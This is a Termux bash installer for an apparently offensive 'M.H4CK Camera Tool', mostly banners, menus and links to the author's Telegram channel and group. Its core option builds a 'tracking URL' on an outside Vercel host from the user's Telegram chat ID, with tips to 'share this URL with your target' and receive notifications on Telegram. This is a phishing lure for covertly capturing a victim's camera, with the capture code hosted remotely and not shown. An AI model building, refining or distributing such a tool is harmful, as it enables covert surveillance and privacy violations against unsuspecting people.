#!/data/data/com.termux/files/usr/bin/bash

echo "Installing M.H4CK Camera Tool..."

BASE="$HOME/.mh4ck"
mkdir -p "$BASE"

cat > "$BASE/mh4ck" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

#============= CONFIGURATION =============#
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RED='\033[1;31m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
WHITE='\033[1;37m'
BLACK='\033[1;30m'
ORANGE='\033[1;33m'
RESET='\033[0m'
BOLD='\033[1m'
BLINK='\033[5m'
UNDERLINE='\033[4m'

#============= BANNER DESIGN =============#
banner(){
clear
echo -e "${RED}╔══════════════════════════════╗${RESET}"
echo -e "${RED}║${RESET}  ${CYAN}${BOLD}███╗   ███╗██╗  ██╗ █████╗  ██████╗██╗  ██╗${RESET} ${RED}║${RESET}"
echo -e "${RED}║${RESET}  ${CYAN}████╗ ████║██║  ██║██╔══██╗██╔════╝██║  ██║${RESET} ${RED}║${RESET}"
echo -e "${RED}║${RESET}  ${CYAN}██╔████╔██║███████║███████║██║     ███████║${RESET} ${RED}║${RESET}"
echo -e "${RED}║${RESET}  ${CYAN}██║╚██╔╝██║██╔══██║██╔══██║██║     ██╔══██║${RESET} ${RED}║${RESET}"
echo -e "${RED}║${RESET}  ${CYAN}██║ ╚═╝ ██║██║  ██║██║  ██║╚██████╗██║  ██║${RESET} ${RED}║${RESET}"
echo -e "${RED}║${RESET}  ${CYAN}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝${RESET} ${RED}║${RESET}"
echo -e "${RED}║${RESET}                                  ${RED}║${RESET}"
echo -e "${RED}║${RESET}     ${GREEN}${BOLD}⚡ M.H4CK CAMERA ⚡${RESET}          ${RED}║${RESET}"
echo -e "${RED}║${RESET}     ${YELLOW}Developer:${RESET} ${WHITE}@mengheang25${RESET}     ${RED}║${RESET}"
echo -e "${RED}║${RESET}     ${YELLOW}Version:${RESET} ${PURPLE}4.0${RESET} | ${GREEN}Active${RESET}        ${RED}║${RESET}"
echo -e "${RED}╚══════════════════════════════╝${RESET}"
echo
}

#============= ANIMATION FUNCTIONS =============#
loading(){
echo -ne "\n${YELLOW}${BOLD}[SYSTEM]${RESET} Initializing "
for i in {1..5}; do
  echo -ne "${CYAN}⏣${RESET}"
  sleep 0.1
done
echo -e "\n"
}

progress_bar(){
local msg="$1"
echo -ne "${PURPLE}${BOLD}[${msg}]${RESET} "
for i in {1..25}; do
  echo -ne "${GREEN}▰${RESET}"
  sleep 0.03
done
echo -e " ${GREEN}Done!${RESET}\n"
}

spinner(){
local pid=$1
local delay=0.1
local spinstr='|/-\'
while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
    local temp=${spinstr#?}
    printf " [%c]  " "$spinstr"
    local spinstr=$temp${spinstr%"$temp"}
    sleep $delay
    printf "\b\b\b\b\b\b"
done
printf "    \b\b\b\b"
}

#============= UTILITY FUNCTIONS =============#
typewriter(){
local text="$1"
local color="$2"
for ((i=0; i<${#text}; i++)); do
    echo -ne "${color}${text:$i:1}${RESET}"
    sleep 0.02
done
echo
}

copy_clip(){
if command -v termux-clipboard-set >/dev/null 2>&1; then
  echo -n "$1" | termux-clipboard-set
  echo -e "\n${GREEN}${BOLD}✔${RESET} ${WHITE}URL copied to clipboard${RESET} ${GREEN}successfully!${RESET}"
else
  echo -e "\n${RED}${BOLD}⚠${RESET} ${WHITE}Clipboard feature not available${RESET}"
fi
}

open_link(){
if command -v termux-open-url >/dev/null 2>&1; then
  termux-open-url "$1"
  echo -e "\n${GREEN}${BOLD}➤${RESET} ${WHITE}Opening link...${RESET} ${GREEN}Done!${RESET}"
else
  echo -e "\n${RED}${BOLD}✖${RESET} ${WHITE}termux-open-url not found!${RESET}"
  echo -e "${YELLOW}Link:${RESET} ${CYAN}$1${RESET}"
fi
sleep 2
}

show_menu(){
echo -e "${BLUE}${BOLD}┌────────────────────────────────────────────┐${RESET}"
echo -e "${BLUE}${BOLD}│${RESET}              ${GREEN}${BOLD}MAIN MENU${RESET}                     ${BLUE}${BOLD}│${RESET}"
echo -e "${BLUE}${BOLD}├────────────────────────────────────────────┤${RESET}"
echo -e "${BLUE}${BOLD}│${RESET}  ${CYAN}${BOLD}[01]${RESET}  ${WHITE}Create Tracking URL${RESET}                    ${BLUE}${BOLD}│${RESET}"
echo -e "${BLUE}${BOLD}│${RESET}  ${CYAN}${BOLD}[02]${RESET}  ${WHITE}Join Telegram Channel 📢${RESET}                ${BLUE}${BOLD}│${RESET}"
echo -e "${BLUE}${BOLD}│${RESET}  ${CYAN}${BOLD}[03]${RESET}  ${WHITE}Join Telegram Group 👥${RESET}                  ${BLUE}${BOLD}│${RESET}"
echo -e "${BLUE}${BOLD}│${RESET}  ${CYAN}${BOLD}[04]${RESET}  ${WHITE}Exit Program ${RED}${BOLD}✖${RESET}                         ${BLUE}${BOLD}│${RESET}"
echo -e "${BLUE}${BOLD}└────────────────────────────────────────────┘${RESET}"
echo
}

show_success(){
echo -e "${GREEN}${BOLD}╔════════════════════════════════════════╗${RESET}"
echo -e "${GREEN}${BOLD}║${RESET}          ✓ OPERATION SUCCESSFUL        ${GREEN}${BOLD}║${RESET}"
echo -e "${GREEN}${BOLD}╚════════════════════════════════════════╝${RESET}"
echo
}

show_header(){
local title="$1"
echo -e "\n${PURPLE}${BOLD}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${RESET}"
echo -e "${PURPLE}${BOLD}┃${RESET}      ${YELLOW}${BOLD}⚡ $title ⚡${RESET}           ${PURPLE}${BOLD}┃${RESET}"
echo -e "${PURPLE}${BOLD}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${RESET}\n"
}

#============= MAIN PROGRAM =============#
while true; do
banner
loading
show_menu

echo -ne "${GREEN}${BOLD}[?]${RESET} ${WHITE}Select option${RESET} ${CYAN}➤${RESET} "
read -p " " choice

case $choice in

1|01)
  show_header "URL GENERATOR"
  
  echo -ne "${YELLOW}${BOLD}[INPUT]${RESET} ${WHITE}Enter your Telegram Chat ID${RESET} ${CYAN}➤${RESET} "
  read -p " " chatid
  
  if [[ -z "$chatid" ]]; then
    echo -e "\n${RED}${BOLD}[ERROR]${RESET} Chat ID cannot be empty!${RESET}"
    sleep 2
    continue
  fi
  
  url="https://heang-ixl7.vercel.app//?id=$chatid"
  
  echo -e "\n${CYAN}${BOLD}[INFO]${RESET} Generating secure URL...${RESET}"
  sleep 0.5
  
  echo -e "\n${GREEN}${BOLD}════════════════════════════════════════════${RESET}"
  echo -e "${WHITE}Your Tracking URL:${RESET}"
  echo -e "${YELLOW}${BOLD}$url${RESET}"
  echo -e "${GREEN}${BOLD}════════════════════════════════════════════${RESET}"
  
  progress_bar "DEPLOYING"
  copy_clip "$url"
  
  echo -e "\n${PURPLE}${BOLD}[TIP]${RESET} Share this URL with your target${RESET}"
  echo -e "${PURPLE}${BOLD}[TIP]${RESET} You'll receive notification on Telegram${RESET}"
  
  echo -e "\n${WHITE}Press Enter to continue...${RESET}"
  read -s -p ""
  ;;

2|02)
  show_header "TELEGRAM CHANNEL"
  
  echo -e "${CYAN}${BOLD}[➤]${RESET} Opening Telegram Channel..."
  sleep 0.5
  echo -e "${CYAN}${BOLD}[➤]${RESET} Channel: ${YELLOW}@Heangcyber25${RESET}"
  
  open_link "https://t.me/Heangcyber25"
  show_success
  ;;

3|03)
  show_header "TELEGRAM GROUP"
  
  echo -e "${CYAN}${BOLD}[➤]${RESET} Opening Telegram Group..."
  sleep 0.5
  echo -e "${CYAN}${BOLD}[➤]${RESET} Group: ${YELLOW}MHSIMPLE TOOLS${RESET}"
  
  open_link "https://t.me/+Z7m3EQDg0Wc0YWZl"
  show_success
  ;;

4|04)
  clear
  echo -e "${RED}${BOLD}╔════════════════════════════════════════╗${RESET}"
  echo -e "${RED}${BOLD}║${RESET}                                      ${RED}${BOLD}║${RESET}"
  echo -e "${RED}${BOLD}║${RESET}   ${YELLOW}Thank you for using M.H4CK Tool${RESET}    ${RED}${BOLD}║${RESET}"
  echo -e "${RED}${BOLD}║${RESET}         ${GREEN}Stay Safe! Stay Hack!${RESET}         ${RED}${BOLD}║${RESET}"
  echo -e "${RED}${BOLD}║${RESET}                                      ${RED}${BOLD}║${RESET}"
  echo -e "${RED}${BOLD}╚════════════════════════════════════════╝${RESET}\n"
  
  typewriter "Exiting system..." "$CYAN"
  sleep 1
  exit 0
  ;;

*)
  echo -e "\n${RED}${BOLD}[ERROR]${RESET} Invalid option! Please select 1-4${RESET}"
  sleep 2
  ;;

esac
done
EOF

chmod +x "$BASE/mh4ck"
ln -sf "$BASE/mh4ck" "$PREFIX/bin/mh4ck"

clear
echo -e "\033[1;32m"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║                                                          ║"
echo "║     ✅ INSTALLATION COMPLETE SUCCESSFULLY!               ║"
echo "║                                                          ║"
echo "║     🚀 Run command: mh4ck                                ║"
echo "║                                                          ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "\033[0m"
